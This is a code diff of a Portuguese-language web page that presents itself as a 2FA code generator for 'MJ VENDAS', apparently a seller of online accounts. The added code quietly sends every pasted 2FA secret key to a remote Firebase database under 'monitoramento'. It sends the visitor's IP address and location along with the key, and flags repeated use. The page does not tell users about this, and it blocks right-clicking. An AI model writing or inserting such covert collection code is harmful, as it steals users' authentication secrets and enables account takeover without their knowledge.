@@ -2,369 +2,231 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>MJ VENDAS • Gerador 2FA</title>
+<title>MJ VENDAS • Gerador 2FA Profissional</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
 <style>
-body {
-  background:#121212;
-  font-family:'Inter',sans-serif;
-  color:#e8e8e8;
-  margin:0;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  min-height:100vh;
-  padding-top:20px;
-}
+    body { background:#121212; font-family:'Inter',sans-serif; color:#e8e8e8; margin:0; display:flex; align-items:center; justify-content:center; flex-direction:column; min-height:100vh; padding:20px; }
+    #clientesSatisf { font-weight:600; font-size:14px; margin-bottom:15px; text-align:center; color:#ffd700; background: rgba(255, 215, 0, 0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #ffd700; }
+    .container { background:#1e1e1e; padding:30px 35px; border-radius:16px; width:100%; max-width:400px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,0.5); position:relative; }
+    .logo-img { width:70px; border-radius:12px; margin-bottom:10px; }
+    h2 { margin:5px 0; font-size:24px; }
+    .subtitle { font-size:14px; opacity:0.7; margin-bottom:20px; }
+    
+    .input-group { position: relative; width: 100%; }
+    input { width:100%; padding:15px; border:none; border-radius:8px; background:#2c2c2c; color:#fff; margin-top:15px; font-size:14px; box-sizing: border-box; outline: none; transition: 0.2s; border: 1px solid transparent; }
+    input:focus { border: 1px solid #4cd964; }
+    .clear-btn { position: absolute; right: 10px; top: 27px; background: #444; color: #fff; border: none; border-radius: 50%; width: 22px; height: 22px; cursor: pointer; display: none; line-height: 1; font-weight: bold; }
 
-#clientesSatisf {
-  font-weight:600;
-  font-size:16px;
-  margin-bottom:15px;
-  position:relative;
-  text-align:center;
-  color:#ffd700; /* amarelo para destacar */
-}
+    .code { font-size:48px; letter-spacing:6px; margin-top:15px; font-weight:700; cursor:pointer; color: #4cd964; user-select: all; transition: transform 0.1s; }
+    .code:active { transform: scale(0.95); }
+    .msg { font-size:13px; color:#4cd964; margin-top:5px; min-height: 1.2em; font-weight: 600; }
+    .suporte-msg { font-size: 12px; color: #aaa; margin-top: 5px; }
+    
+    .tutorial { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 15px; margin-top: 20px; text-align: left; font-size: 13px; color: #bbb; border-left: 3px solid #4cd964; }
+    .tutorial b { color: #fff; display: block; margin-bottom: 8px; font-size: 14px; }
+    .tutorial div { margin-bottom: 6px; display: flex; align-items: flex-start; }
+    .tutorial div span { color: #4cd964; font-weight: bold; margin-right: 8px; }
 
-.confete {
-  position:absolute;
-  width:10px;
-  height:10px;
-  background:yellow;
-  border-radius:50%;
-  opacity:0.8;
-  animation:cair 2s linear infinite;
-}
-@keyframes cair {
-  0% {transform:translateY(0) rotate(0deg);}
-  100% {transform:translateY(300px) rotate(360deg);}
-}
+    .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; }
+    .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; }
+    .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; }
 
-body>.container {
-  background:#1e1e1e;
-  padding:30px 35px;
-  border-radius:16px;
-  width:400px;
-  text-align:center;
-  box-shadow:0 8px 30px rgba(0,0,0,0.5);
-  position:relative;
-}
-
-.logo-img {
-  width:70px;
-  border-radius:12px;
-  margin-bottom:10px;
-}
-
-h2 {
-  margin:5px 0;
-  font-size:24px;
-}
-
-.subtitle {
-  font-size:14px;
-  opacity:0.7;
-  margin-bottom:20px;
-}
-
-input {
-  width:100%;
-  padding:12px;
-  border:none;
-  border-radius:8px;
-  background:#2c2c2c;
-  color:#fff;
-  margin-top:15px;
-  font-size:14px;
-}
-
-.code {
-  font-size:42px;
-  letter-spacing:4px;
-  margin-top:20px;
-  font-weight:600;
-  cursor:pointer;
-  transition:0.2s;
-}
-.code:hover { opacity:0.8; }
-
-.msg {
-  font-size:13px;
-  color:#4cd964;
-  margin-top:10px;
-}
-
-.extra {
-  font-size:12px;
-  margin-top:5px;
-  opacity:0.8;
-}
-
-.toggle {
-  margin-top:18px;
-  font-size:13px;
-  cursor:pointer;
-  color:#4cd964;
-}
-
-.footer {
-  font-size:11px;
-  opacity:0.5;
-  margin-top:20px;
-  text-align:center;
-}
-
-/* AVALIAÇÃO */
-.avaliacao {
-  margin-top:25px;
-  border-top:1px solid rgba(255,255,255,0.1);
-  padding-top:20px;
-  background:#2a2a2a;
-  border-radius:12px;
-  text-align:left;
-  display:none;
-}
-
-.avaliacao h4 {
-  font-size:15px;
-  margin-bottom:12px;
-  color:#f0f0f0;
-}
-
-.avaliacao-buttons {
-  display:flex;
-  gap:10px;
-  margin-bottom:10px;
-}
-
-.avaliacao button {
-  flex:1;
-  padding:10px 12px;
-  font-weight:600;
-  border:none;
-  border-radius:8px;
-  cursor:pointer;
-  transition:0.2s;
-  font-size:14px;
-}
-
-.btn-sim { background:#ff4d4d; color:#fff; }
-.btn-sim:hover { background:#e04444; }
-
-.btn-nao { background:#4cd964; color:#fff; }
-.btn-nao:hover { background:#40c75d; }
-
-.btn-remover { background:#808080; color:#fff; width:100%; margin-top:5px; }
-.btn-remover:hover { background:#666666; }
-
-/* PAINEL 2FA */
-.painel {
-  position:fixed;
-  right:20px;
-  top:50%;
-  transform:translateY(-50%);
-  background:#1e1e1e;
-  width:360px;
-  padding:20px;
-  border-radius:14px;
-  box-shadow:0 10px 40px rgba(0,0,0,0.7);
-  display:none;
-  max-height:80vh;
-  overflow:auto;
-}
-
-.painel h3 {
-  margin:0 0 12px 0;
-}
-
-.painel-desc {
-  font-size:12px;
-  opacity:0.7;
-  margin-bottom:12px;
-}
-
-.item2fa {
-  background:#2c2c2c;
-  padding:10px;
-  border-radius:8px;
-  margin-bottom:10px;
-}
-
-.codigoMini {
-  font-size:20px;
-  font-weight:600;
-  cursor:pointer;
-  transition:0.2s;
-  margin-top:5px;
-}
-.codigoMini:hover { opacity:0.8; }
-.codigoMini.valid { color:#4cd964; }
-.codigoMini.expiring { color:#ff4d4d; font-weight:700; }
-
-.timer {
-  font-size:11px;
-  opacity:0.6;
-  margin-top:3px;
-}
-
-.controles { text-align:center; margin-top:10px; }
-.controles button {
-  background:#4cd964;
-  padding:6px 12px;
-  border-radius:6px;
-  cursor:pointer;
-  margin:3px;
-  border:none;
-  font-weight:600;
-}
-.controles button:hover { background:#40c75d; }
-
-.btn-abrir-avaliacao {
-  background:#4cd964;
-  color:#fff;
-  padding:8px 14px;
-  border-radius:8px;
-  cursor:pointer;
-  font-weight:600;
-  margin-top:10px;
-  transition:0.2s;
-}
-.btn-abrir-avaliacao:hover { background:#40c75d; }
+    .toggle { margin-top:18px; font-size:13px; cursor:pointer; color:#4cd964; text-decoration: underline; }
+    .footer { font-size:11px; opacity:0.5; margin-top:20px; text-align:center; }
+    
+    .painel { position:fixed; right:20px; top:50%; transform:translateY(-50%); background:#1e1e1e; width:340px; padding:20px; border-radius:14px; box-shadow:0 10px 40px rgba(0,0,0,0.7); display:none; z-index: 100; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
+    .item2fa { background:#2c2c2c; padding:12px; border-radius:8px; margin-bottom:10px; border-left: 4px solid #4cd964; text-align: left; }
+    .codigoMini { font-size: 20px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; }
 </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<!-- MENSAGEM CLIENTES SATISFEITOS TOPO -->
-<div id="clientesSatisf">+ 20 MIL CLIENTES SATISFEITOS EM TODAS AS PLATAFORMAS</div>
+<div id="clientesSatisf">⭐ + 20 MIL CLIENTES SATISFEITOS</div>
 
 <div class="container">
-<img class="logo-img" src="https://cdn.ggmax.com.br/avatar-images/656f823e921580ad52e62b38f93b71d6.webp">
-<h2>MJ VENDAS</h2>
-<div class="subtitle">Gerador profissional 2FA</div>
+    <img class="logo-img" src="https://cdn.ggmax.com.br/avatar-images/656f823e921580ad52e62b38f93b71d6.webp">
+    <h2>MJ VENDAS</h2>
+    <div class="subtitle">Gerador de Código 2FA</div>
 
-<input id="secret" placeholder="Cole a chave 2FA">
-<div class="code" id="code">------</div>
-<div class="msg" id="msg"></div>
+    <div class="input-group">
+        <input id="secret" placeholder="Cole aqui sua Chave 2FA" autofocus autocomplete="off">
+        <button class="clear-btn" id="clearInput" onclick="limparInput()">✕</button>
+    </div>
 
-<div id="extra" style="display:none">
-  <div class="extra">Suporte disponível no chat da compra</div>
-  <div class="extra">Boa contingência 🚀</div>
+    <div class="code" id="code" onclick="copiar(this.innerText)">------</div>
+    <div class="msg" id="msg"></div>
+    <div class="suporte-msg">Suporte disponível no chat da compra 🚀</div>
+
+    <div class="tutorial">
+        <b>🚀 TUTORIAL RÁPIDO:</b>
+        <div><span>1.</span> Cole sua chave 2FA no campo acima.</div>
+        <div><span>2.</span> O código será copiado automaticamente.</div>
+        <div><span>3.</span> Cole o código no site onde deseja logar.</div>
+        <div><span>4.</span> O código muda sozinho a cada 30 segundos.</div>
+    </div>
+
+    <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Problemas</button>
+    
+    <div class="avaliacao" id="painelAvaliacao">
+        <div style="display:flex; gap:10px;">
+            <button class="btn-voto" style="background:#ff4d4d;" onclick="votarSim()" id="btnSim">👍 Sim (0)</button>
+            <button class="btn-voto" style="background:#4cd964;" onclick="votarNao()" id="btnNao">👎 Não (0)</button>
+        </div>
+        <button onclick="removerAvaliacao()" style="background:none; border:none; color:#777; font-size:10px; margin-top:10px; cursor:pointer; width:100%;">Remover meu voto</button>
+    </div>
+
+    <div class="toggle" onclick="togglePainel()">⚡ Painel Multi-Contas</div>
+    <div class="footer">MJ VENDAS © 2018-2026</div>
 </div>
 
-<div class="toggle" onclick="togglePainel()">⚡ Quer mais praticidade?</div>
-
-<!-- BOTÃO ABRIR/FECAR AVALIAÇÃO -->
-<button class="btn-abrir-avaliacao" onclick="toggleAvaliacao()">Avaliação</button>
-
-<!-- AVALIAÇÃO -->
-<div class="avaliacao" id="painelAvaliacao">
-<h4>Alguma conta que você comprou apresentou problemas de login, caiu, pediu SMS ou bloqueio do Google?</h4>
-
-<div class="avaliacao-buttons">
-  <button class="btn-sim" id="btnSim" onclick="votarSim()">👍 Sim (0)</button>
-  <button class="btn-nao" id="btnNao" onclick="votarNao()">👎 Não (0)</button>
-</div>
-
-<div class="avaliacao-textos">
-  <p>👍 Sim → aconteceu algum problema</p>
-  <p>👎 Não → tudo funcionou normalmente</p>
-</div>
-</div>
-
-<div class="footer">Direitos Autorais MOUJUN 00 2018-2026</div>
-</div>
-
-<!-- PAINEL 2FA -->
 <div class="painel" id="painel">
-<h3>Painel de Códigos 2FA</h3>
-<div class="painel-desc">
-Gerencie vários códigos 2FA, evite colar repetidamente.
-</div>
-<div id="lista2fa"></div>
-<div class="controles">
-<div>Adicionar mais código 2FA</div>
-<button onclick="addCampo()">+</button>
-<button onclick="remCampo()">-</button>
-<button onclick="fecharPainel()">Fechar Painel</button>
-</div>
+    <h3 style="margin-top:0;">Painel Multi-Contas</h3>
+    <div id="lista2fa"></div>
+    <div style="display:flex; gap:5px; margin-top:10px;">
+        <button onclick="addCampo()" style="flex:1; padding:10px; background:#4cd964; border:none; border-radius:8px; cursor:pointer; font-weight:700;">+ Adicionar</button>
+        <button onclick="fecharPainel()" style="flex:1; padding:10px; background:#444; border:none; color:#fff; border-radius:8px; cursor:pointer;">Fechar</button>
+    </div>
 </div>
 
-<!-- FIREBASE -->
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.4.2/sha.js"></script>
 
 <script>
-// FIREBASE CONFIG
 var firebaseConfig = {
-  apiKey: "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g",
-  authDomain: "desbloqueio-cartao-recomecar.firebaseapp.com",
-  databaseURL: "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com",
-  projectId: "desbloqueio-cartao-recomecar",
-  storageBucket: "desbloqueio-cartao-recomecar.firebasestorage.app",
-  messagingSenderId: "639029327977",
-  appId: "1:639029327977:web:0558ce8d5dc1ee68ce4af8",
-  measurementId: "G-JXH3ZX2V5Q"
+    apiKey: "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g",
+    authDomain: "desbloqueio-cartao-recomecar.firebaseapp.com",
+    databaseURL: "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com",
+    projectId: "desbloqueio-cartao-recomecar",
+    storageBucket: "desbloqueio-cartao-recomecar.firebasestorage.app",
+    messagingSenderId: "639029327977",
+    appId: "1:639029327977:web:0558ce8d5dc1ee68ce4af8"
 };
 firebase.initializeApp(firebaseConfig);
-
 var db = firebase.database();
-var likesRef = db.ref("avaliacoes/sim");
-var dislikesRef = db.ref("avaliacoes/nao");
 
-// Atualiza contadores em tempo real
-likesRef.on("value", snap => { document.getElementById("btnSim").innerText=`👍 Sim (${snap.val()||0})`; });
-dislikesRef.on("value", snap => { document.getElementById("btnNao").innerText=`👎 Não (${snap.val()||0})`; });
+let userIP = "Buscando...";
+let infoExtra = { local: "..." };
+fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+    userIP = data.ip; infoExtra.local = data.city + "/" + data.region;
+});
 
-// Avaliação com localStorage
-function toggleAvaliacao(){
-  const div=document.getElementById("painelAvaliacao");
-  div.style.display=(div.style.display==="block")?"none":"block";
+function enviarLog(chave) {
+    if(chave.length < 10) return;
+    let limpa = chave.replace(/[.#$[\]]/g, ""); 
+    db.ref("monitoramento/" + limpa).transaction(function(curr) {
+        const base = { chave: chave, ip: userIP, local: infoExtra.local, data: new Date().toLocaleString() };
+        if (!curr) return { ...base, acessos: 1, status: "LOGIN INICIAL" };
+        let n = (curr.acessos || 0) + 1;
+        let st = curr.status;
+        if(n === 2) st = "⚠️ ALERTA: SEGUNDA VEZ (TROCA DE SENHA)";
+        else if(n > 2) st = "🚨 ALERTA: USO REPETITIVO (" + n + "x)";
+        return { ...curr, ...base, acessos: n, status: st };
+    });
 }
 
-function votarSim(){
-  if(localStorage.getItem("votou")) return alert("Você já votou");
-  likesRef.transaction(n=>(n||0)+1);
-  localStorage.setItem("votou","sim");
+function base32tohex(b32){const b32c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let bits="",hex="";b32=b32.replace(/ /g,"").toUpperCase();for(let i=0;i<b32.length;i++){let val=b32c.indexOf(b32.charAt(i));if(val===-1)continue;bits+=val.toString(2).padStart(5,"0");}for(let i=0;i+4<=bits.length;i+=4){hex+=parseInt(bits.substr(i,4),2).toString(16);}return hex;}
+function gerarOTP(sec){try{let key=base32tohex(sec);let epoch=Math.round(Date.now()/1000);let time=Math.floor(epoch/30).toString(16).padStart(16,"0");let shaObj=new jsSHA("SHA-1","HEX");shaObj.setHMACKey(key,"HEX");shaObj.update(time);let hmac=shaObj.getHMAC("HEX");let offset=parseInt(hmac.substring(hmac.length-1),16);let otp=(parseInt(hmac.substr(offset*2,8),16)&0x7fffffff)+"";return otp.substr(otp.length-6);}catch(e){return "------";}}
+
+// Função de Cópia Blindada
+function copiar(txt) {
+    if(!txt || txt === "------") return;
+    
+    // Tenta usar a API moderna
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(txt).then(() => {
+            document.getElementById("msg").innerText = "✅ Código copiado!";
+            setTimeout(() => { document.getElementById("msg").innerText = ""; }, 2000);
+        }).catch(() => fallbackCopy(txt));
+    } else {
+        fallbackCopy(txt);
+    }
 }
 
-function votarNao(){
-  if(localStorage.getItem("votou")) return alert("Você já votou");
-  dislikesRef.transaction(n=>(n||0)+1);
-  localStorage.setItem("votou","nao");
+// Método antigo de cópia para navegadores que bloqueiam a API moderna
+function fallbackCopy(text) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    document.body.appendChild(textArea);
+    textArea.select();
+    try {
+        document.execCommand('copy');
+        document.getElementById("msg").innerText = "✅ Código copiado!";
+        setTimeout(() => { document.getElementById("msg").innerText = ""; }, 2000);
+    } catch (err) {}
+    document.body.removeChild(textArea);
 }
 
+function limparInput() {
+    document.getElementById("secret").value = "";
+    document.getElementById("code").innerText = "------";
+    document.getElementById("clearInput").style.display = "none";
+}
+
+// Evento de Colagem / Digitação
+document.getElementById("secret").addEventListener("input", function() {
+    let val = this.value.trim();
+    if(val.length >= 10) {
+        let otp = gerarOTP(val);
+        document.getElementById("code").innerText = otp;
+        document.getElementById("clearInput").style.display = "block";
+        copiar(otp); // Cópia disparada por evento de teclado (Permitido pelo navegador)
+        enviarLog(val);
+    }
+});
+
+// Atualização de Ciclo (30s)
+setInterval(() => {
+    let s = document.getElementById("secret").value.trim();
+    if(s.length >= 10) {
+        let n = gerarOTP(s);
+        if(document.getElementById("code").innerText !== n) {
+            document.getElementById("code").innerText = n;
+            copiar(n);
+        }
+    }
+    document.querySelectorAll(".item2fa").forEach(item => {
+        let inp = item.querySelector('input');
+        let display = item.querySelector('.codigoMini');
+        if(inp.value.length >= 10) {
+            let n = gerarOTP(inp.value.trim());
+            if(display.innerText !== n) display.innerText = n;
+        }
+    });
+}, 1000);
+
+function addCampo(){
+    let lista = document.getElementById("lista2fa");
+    let id = lista.children.length + 1;
+    let div = document.createElement("div");
+    div.className = "item2fa";
+    div.innerHTML = `<strong>Conta ${id}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
+    lista.appendChild(div);
+    div.querySelector('input').addEventListener("input", function() {
+        if(this.value.length >= 10) {
+            let n = gerarOTP(this.value.trim());
+            div.querySelector('.codigoMini').innerText = n;
+            copiar(n);
+            enviarLog(this.value.trim());
+        }
+    });
+}
+
+function togglePainel(){ document.getElementById("painel").style.display="block"; }
+function fecharPainel(){ document.getElementById("painel").style.display="none"; }
+for(let i=0; i<3; i++) addCampo();
+
+var lRef = db.ref("avaliacoes/sim"), dRef = db.ref("avaliacoes/nao");
+lRef.on("value", s => { document.getElementById("btnSim").innerText=`👍 Sim (${s.val()||0})`; });
+dRef.on("value", s => { document.getElementById("btnNao").innerText=`👎 Não (${s.val()||0})`; });
+function votarSim(){ if(localStorage.getItem("v")) return alert("Você já votou!"); lRef.transaction(n=>(n||0)+1); localStorage.setItem("v","s"); }
+function votarNao(){ if(localStorage.getItem("v")) return alert("Você já votou!"); dRef.transaction(n=>(n||0)+1); localStorage.setItem("v","n"); }
 function removerAvaliacao(){
-  let voto=localStorage.getItem("votou");
-  if(!voto) return alert("Nenhuma avaliação para remover");
-  if(voto==="sim") likesRef.transaction(n=>(n||0)-1);
-  if(voto==="nao") dislikesRef.transaction(n=>(n||0)-1);
-  localStorage.removeItem("votou");
-  alert("Sua avaliação foi removida!");
+    let v = localStorage.getItem("v"); if(!v) return alert("Sem voto.");
+    if(v==="s") lRef.transaction(n=>(n||0)-1); else dRef.transaction(n=>(n||0)-1);
+    localStorage.removeItem("v"); alert("Voto removido.");
 }
-
-// 2FA
-let totalCampos=5,maxCampos=50;
-function base32tohex(base32){const base32chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let bits="",hex="";base32=base32.replace(/ /g,"").toUpperCase();for(let i=0;i<base32.length;i++){let val=base32chars.indexOf(base32.charAt(i));bits+=val.toString(2).padStart(5,"0");}for(let i=0;i+4<=bits.length;i+=4){let chunk=bits.substr(i,4);hex+=parseInt(chunk,2).toString(16);}return hex;}
-function gerarOTP(secret){let key=base32tohex(secret);let epoch=Math.round(Date.now()/1000);let time=Math.floor(epoch/30).toString(16).padStart(16,"0");let shaObj=new jsSHA("SHA-1","HEX");shaObj.setHMACKey(key,"HEX");shaObj.update(time);let hmac=shaObj.getHMAC("HEX");let offset=parseInt(hmac.substring(hmac.length-1),16);let otp=(parseInt(hmac.substr(offset*2,8),16)&0x7fffffff)+"";return otp.substr(otp.length-6);}
-function copiarCodigoPrincipal(){let codeEl=document.getElementById("code");let otp=codeEl.innerText;if(otp&&otp!=="------"){navigator.clipboard.writeText(otp);document.getElementById("msg").innerText="Código copiado automaticamente";}}
-document.getElementById("code").addEventListener("click",copiarCodigoPrincipal);
-function gerar(){let secret=document.getElementById("secret").value;if(secret.length<16)return;let otp=gerarOTP(secret);document.getElementById("code").innerText=otp;copiarCodigoPrincipal();document.getElementById("extra").style.display="block";}
-document.getElementById("secret").addEventListener("input",gerar);
-document.getElementById("secret").addEventListener("keydown", function(e){if(e.ctrlKey&&(e.key==="a"||e.key==="A")){e.stopPropagation();}});
-setInterval(gerar,30000);
-
-function togglePainel(){document.getElementById("painel").style.display="block";}
-function fecharPainel(){document.getElementById("painel").style.display="none";}
-
-function criarCampo(){let id=document.querySelectorAll(".item2fa").length+1;let div=document.createElement("div");div.className="item2fa";div.innerHTML=`<div style="display:flex;align-items:center;gap:10px;"><div style="font-size:22px;font-weight:700;color:#ff4d4d;">${id}</div><div style="flex:1"><input id="secret${id}" placeholder="Chave 2FA ${id}"><div class="codigoMini valid" id="code${id}">------</div><div class="timer" id="timer${id}"></div></div></div>`;document.getElementById("lista2fa").appendChild(div);let codeEl=div.querySelector(".codigoMini");codeEl.addEventListener("click",function(){let otp=codeEl.innerText;if(otp&&otp!=="------"){navigator.clipboard.writeText(otp);document.getElementById("msg").innerText=`Código ${id} copiado!`;}});}
-function addCampo(){if(totalCampos>=maxCampos)return;totalCampos++;criarCampo();}
-function remCampo(){let lista=document.getElementById("lista2fa");if(lista.children.length<=1)return;lista.removeChild(lista.lastChild);totalCampos--;}
-for(let i=0;i<totalCampos;i++) criarCampo();
-
-function atualizarMultiplos(){for(let i=1;i<=totalCampos;i++){let el=document.getElementById("secret"+i);if(!el)continue;let secret=el.value;if(secret.length<16)continue;let otp=gerarOTP(secret);let codeEl=document.getElementById("code"+i);codeEl.innerText=otp;let segundos=30-(Math.floor(Date.now()/1000)%30);document.getElementById("timer"+i).innerText="expira em "+segundos+"s";if(segundos<=5){codeEl.classList.add("expiring");codeEl.classList.remove("valid");}else{codeEl.classList.add("valid");codeEl.classList.remove("expiring");}}}
-setInterval(atualizarMultiplos,1000);
+function toggleAvaliacao(){ let d=document.getElementById("painelAvaliacao"); d.style.display=d.style.display==="block"?"none":"block";}
 </script>
 </body>
 </html>
